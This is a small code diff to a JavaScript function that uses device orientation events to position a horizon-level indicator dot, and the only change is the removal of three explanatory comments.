@@ -2858,11 +2779,10 @@ function initOrient(){
   if(window.DeviceOrientationEvent){
     window.addEventListener('deviceorientation',e=>{
       if(!S.showHorizon) return;
-      const beta=e.beta||0; // front-back tilt
-      const gamma=e.gamma||0; // left-right tilt
+      const beta=e.beta||0;
+      const gamma=e.gamma||0;
       const isLevel=Math.abs(beta)<3&&Math.abs(gamma)<3;
       $('hzDot').classList.toggle('level',isLevel);
-      // Move dot based on tilt
       const x=50+Math.max(-45,Math.min(45,gamma));
       const y=50+Math.max(-45,Math.min(45,beta-90));
       $('hzDot').style.left=x+'%'; $('hzDot').style.top=y+'%';
